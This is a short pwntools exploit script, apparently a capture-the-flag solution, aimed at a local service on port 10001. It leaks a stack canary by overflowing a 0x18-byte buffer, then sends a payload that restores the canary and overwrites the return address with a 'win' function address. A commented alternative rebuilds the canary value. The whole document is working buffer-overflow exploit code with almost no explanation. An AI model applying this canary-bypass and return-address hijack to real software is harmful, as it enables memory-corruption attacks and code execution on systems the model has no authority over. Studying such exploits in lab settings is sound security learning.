from pwn import *


p=remote("localhost",10001)

win=0x00000000004013ef
p.sendline(b"a"*0x18)  # win+77 & 0xff gets the first byte of the adress we want to jump to 

p.recvuntil(b"a"*0x18+b"\n")
leak=p.recv(7)

p.sendline(b"a"*0x18+b"\x00"+leak+b"b"*8+p64(win))

#another way to do it 
#canary_value=u64(b"\x00"+leak)
#print(hex(canary_value))
#p.sendline(b"a"*0x18+p64(canary_value)+b"a"*8+p64(win))



p.interactive()